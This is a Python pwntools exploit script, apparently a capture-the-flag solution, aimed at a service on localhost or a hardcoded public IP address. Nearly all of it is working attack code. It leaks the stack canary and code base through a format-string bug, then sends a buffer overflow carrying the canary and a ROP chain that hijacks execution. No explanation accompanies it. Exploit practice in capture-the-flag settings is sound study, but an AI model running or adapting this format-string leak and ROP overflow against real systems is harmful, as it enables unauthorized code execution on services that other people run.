from pwn import *
import time
import re


def packAll(rop):
    return flat([p64(x) for x in rop])
local = 1
if local:
    r = remote('127.0.0.1', 8333)
else:
    r = remote('54.222.255.223', 50002)

r.sendlineafter('--> guest ','3')
r.sendlineafter('Input your msg:','%p'*0x40)
time.sleep(0.5)
stack = r.recv(1000).replace('0x',')').replace('(', ')').split(')')[1:]
canary = p64(int(stack[26], 16))
ret = int(stack[30], 16)
code_base = ret-0x1612
log.info('code base: 0x%x'%(code_base))
log.info('canary: 0x%x'%u64(canary))

prdi = 0x00000000000018f3+code_base

if local:
    r = remote('127.0.0.1', 8333)
else:
    r = remote('54.222.255.223', 50002)

code = 0xFAD+code_base
rop = [0x1111111, 0x11111111, 0x11111111, prdi, 4, 0xf09+code_base, code]
r.sendlineafter('--> guest ', '1')

r.sendlineafter('Name:', 'A'*0x28+canary+packAll(rop))
print r.recvline()
